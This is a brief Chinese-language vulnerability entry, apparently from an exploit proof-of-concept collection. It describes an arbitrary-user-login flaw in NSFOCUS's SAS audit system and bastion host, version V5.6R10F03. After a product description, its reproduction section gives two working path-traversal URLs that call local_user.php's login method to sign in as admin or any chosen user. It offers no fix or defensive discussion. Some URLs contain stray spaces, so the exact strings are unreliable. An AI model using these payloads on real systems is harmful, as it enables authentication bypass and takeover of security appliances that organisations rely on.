#### 影响范围

V5.6R10F03 

#### 漏洞类型

任意用户登录

#### 利用条件

影响范围应用

#### 漏洞概述

绿盟安全审计系统SAS采用先进的协议识别和智能关联分析技术，对网络数据进行采集、分析和识别，实时动态监测通信内容、网络行为等，对发现的敏感信息传输、违规网络行为实时告警，并全面记录用户上网行为，为调查取证提供依据，满足"151号令"法规要求

#### 漏洞复现

 通过修改user_account参数证明可登录不同用户：

```
https://堡垒机IP/api/virtual/home/status?cat=....//....//....//....//....//....//....//....//....//....//....//..../ /....//....//usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
```

老版堡垒机：

```
https://堡垒机IP/api/virtual/home/status? cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2 /www/local_user.php&method=login&user_account=
```